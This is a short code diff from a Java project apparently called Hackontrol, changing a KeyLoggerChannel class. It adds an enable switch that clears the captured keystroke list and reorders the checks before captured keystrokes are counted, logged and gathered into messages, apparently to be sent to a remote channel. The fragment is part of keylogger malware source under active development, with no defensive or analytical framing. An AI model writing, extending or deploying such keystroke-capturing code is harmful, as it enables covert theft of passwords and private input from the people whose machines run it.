@@ -41,11 +41,16 @@ public class KeyLoggerChannel extends HackontrolChannel {
 	}
 
 	private void threadKeyLogger() {
-		try {
-			if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
-				return;
-			}
+		if(!NativeLibrary.Enable) {
+			NativeLibrary.KEYSTROKE_LIST.clear();
+			return;
+		}
 
+		if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
+			return;
+		}
+
+		try {
 			int size = NativeLibrary.KEYSTROKE_LIST.size();
 			Hackontrol.LOGGER.info("Key stroke: {}", size);
 			List<String> messageList = new ArrayList<>();
